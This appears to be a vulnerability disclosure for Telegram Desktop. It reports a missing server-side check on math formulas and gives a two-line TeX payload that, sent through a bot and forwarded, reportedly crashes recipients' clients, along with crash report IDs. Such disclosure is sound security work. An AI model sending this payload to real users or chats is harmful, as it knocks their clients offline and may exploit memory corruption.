The vulnerability exists since Telegram Desktop version 6.8.2 beta.

Math formulas are not validated server-side.
I was able to bypass the server-side validation entirely.


## Reproduce

Create a Telegram bot that returns this simple TeX formula (either create one yourself or use any AI bot. I used an AI bot from https://t.me/claw).

```
\begin{array}{c}\multirow{5}{*}{x}\end{array}
\begin{matrix}\multirow{20}{*}{x}\end{matrix}
```

## Impact

By forwarding this single message, an attacker can crash any user, a group of users, a channel, or a supergroup in real time.

This is a memory corruption bug.

---


I reproduced the crash on the
official Telegram Desktop release build.

6.9.3 Linux x86_64

Crash reports:


```
08682c91-c5cc-4d26-51110f98-722b8617
ff1d7b35-4db4-46c0-7ddc9085-8ba40a37
9ba7274e-c2de-48e5-75dcf49a-a4b80b97
03a29b41-17c7-4a6d-26c1e0bc-a1cf4495
```
